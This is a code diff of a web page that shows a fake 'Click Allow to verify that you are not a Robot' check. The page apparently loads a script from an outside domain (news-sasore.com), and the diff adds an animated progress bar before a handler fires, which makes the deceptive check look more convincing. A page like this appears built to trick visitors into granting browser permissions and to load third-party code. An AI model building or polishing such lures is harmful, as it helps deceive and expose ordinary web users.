@@ -59,6 +59,14 @@
             background-color: #0058b5; /* Màu nền xanh da trời sáng hơn khi hover */
         }
 
+        #line-processing {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 5px;
+            background-color: #1E90FF;
+        }
+
         @media screen and (max-width: 1279px) {
             #image-space {
                 left: 50%;
@@ -91,6 +99,7 @@
         <div id="text-space">
             <span id="text"><b>Click Allow</b>&nbsp;to verify that you are not a Robot</span><br>
             <button id="btn-allow">Allow</button>
+            <div id="line-processing"></div>
         </div>
         <div id="image-space">
             <img width="100%" src="./images/robot.avif" alt="">
@@ -139,7 +148,19 @@
             script2.src = 'https://news-sasore.com/process.js?id=1222197208';
             document.body.appendChild(script2);
 
-            setTimeout(handler, 7500);
+            let time = 0;
+            const lineProcessing = document.getElementById('line-processing');
+            const processing = setInterval(() => {
+                time += 500;
+                if(time > 7500) {
+                    clearInterval(processing);
+                    handler();
+                    return;
+                }
+                const percent = Math.round((time/7500)*100);
+                lineProcessing.style.width = percent.toString() + '%';
+
+            }, 500);
         }
     </script>
 </body>
